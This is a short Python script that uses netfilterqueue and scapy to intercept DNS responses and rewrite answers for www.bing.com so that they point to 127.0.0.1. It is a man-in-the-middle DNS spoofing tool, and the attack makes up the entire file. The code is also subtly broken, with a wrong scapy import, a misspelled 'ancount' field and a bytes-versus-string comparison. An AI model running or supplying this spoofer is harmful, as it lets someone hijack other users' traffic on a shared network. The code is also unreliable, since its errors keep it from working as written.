import netfilterqueue
import scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.has_layer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] DNSRRRRRRR")
            answer = scapy.DNSRR(rrname=qname, rdata="127.0.0.1")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].account = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()